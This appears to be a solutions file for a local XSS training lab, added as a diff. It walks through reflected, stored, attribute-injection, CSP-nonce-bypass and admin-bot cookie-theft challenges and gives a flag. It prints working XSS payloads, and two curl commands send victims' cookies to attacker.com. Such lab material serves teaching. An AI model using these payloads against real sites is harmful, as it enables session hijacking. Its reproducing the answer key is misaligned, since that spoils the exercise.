@@ -1,0 +1,78 @@
+===============================================================================
+  CyberForum — XSS Lab Solutions (Port 5002)
+===============================================================================
+
+CHALLENGE 1: Reflected XSS (Search)
+Flag: (no direct flag — used to demonstrate reflected XSS)
+
+  The /search endpoint renders the query with Markup() bypassing
+  Jinja2 auto-escaping:
+
+  http://localhost:5002/search?q=<script>alert('XSS')</script>
+
+  Alternative payloads:
+    ?q=<img src=x onerror=alert(document.cookie)>
+    ?q=<svg onload=alert(1)>
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Stored XSS (Comments)
+Flag: (no direct flag — used to steal cookies)
+
+  The /post/<id>/comment endpoint stores comments without sanitization.
+  Comments are rendered with the |safe filter in templates.
+
+  curl -X POST http://localhost:5002/post/1/comment \
+    -d "username=hacker&content=<script>document.location='http://attacker.com/?c='+document.cookie</script>"
+
+  When any user views the post, the script executes and sends
+  their cookies to the attacker.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: DOM XSS (Profile)
+Flag: (no direct flag — demonstrates attribute injection)
+
+  The /profile/<id> endpoint renders display_name with |safe in
+  an HTML attribute context. User 3 (Alt) has injectable display_name.
+
+  Visit: http://localhost:5002/profile/3
+
+  The display_name is rendered unsafely, enabling attribute injection
+  and event handler XSS.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: CSP Bypass (Predictable Nonce)
+Flag: (no direct flag — demonstrates CSP bypass)
+
+  The /csp-demo endpoint sets a Content-Security-Policy with a
+  hardcoded nonce: 'nonce-abc123'
+
+  Since the nonce is predictable (always abc123), bypass CSP:
+
+  http://localhost:5002/csp-demo?comment=<script nonce="abc123">alert('CSP Bypassed')</script>
+
+  In real apps, nonces must be cryptographically random per request.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Cookie Theft via Admin Bot
+Flag: FLAG{xss_c00kie_st34l}
+
+  The /report endpoint simulates an admin bot visiting a URL.
+  Submit a URL containing an XSS payload that steals the admin's cookie.
+
+  curl -X POST http://localhost:5002/report \
+    -d "url=http://localhost:5002/search?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
+
+  The bot (simulated server-side) "visits" the URL with admin cookies.
+  The flag is returned in the response when the bot processes the report.
+
+  Direct test:
+  curl -X POST http://localhost:5002/report \
+    -d "url=http://localhost:5002/"
+
+  The response contains: FLAG{xss_c00kie_st34l}
+
+===============================================================================
